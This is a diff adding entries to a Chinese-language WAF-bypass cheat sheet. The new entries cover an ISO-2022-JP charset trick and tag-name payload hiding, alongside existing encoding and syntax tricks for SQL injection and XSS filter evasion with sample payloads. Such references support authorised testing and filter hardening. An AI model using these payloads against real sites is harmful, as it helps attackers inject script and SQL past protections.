@@ -31,6 +31,8 @@ curl -s -I https://target.com | grep -iE "server|x-cdn|x-cache|cf-ray|x-sucuri|x
 ## 2. 通用绕过类别（速查）
 
 编码: 单/双/三重 URL（%3C→%253C→%25253C）、IIS Unicode %u003c、超长 UTF-8 %C0%BC、HTML 实体 &#60;/&#x3c;、SQL hex 0x756E696F6E、大小写 SeLeCt、空字节 sel%00ect、八进制 \74。
+响应 charset 切换（ISO-2022-JP）: 能注入响应头时（头注入/CRLF/CT 可控），加 `Content-Type: text/html; charset=ISO-2022-JP`，payload 里插 `(B`（US-ASCII 逃逸序列）——WAF 按字节匹配看到 `<scr(Bipt>` 不命中 `<script`，浏览器解码 `(B` 后看到完整 `<script>`。payload 形如 `<scr(Bipt>alert(B(1(B)</scr(Bipt>`。
+标签名藏 payload: 关键字全在标签名位置 + `localName` 小写读取执行（WAF 只检属性值与常见标签名）——payload 族见 `xss-advanced.md` §3「Tag name 载荷族」。
 注释/分割: SQL `/**/`、`/*!50000*/` 版本注释、UN/**/ION；PHP `sys/*x*/tem()`；XSS 分段 `"o<x>nmouseover=`。
 空白字符: %09 %0A %0D %0B %0C %A0。
 替代语法: UNION ALL SELECT、OR 2>1/||、BENCHMARK 代 SLEEP、MID 代 SUBSTRING、Function()/setTimeout 代 eval。
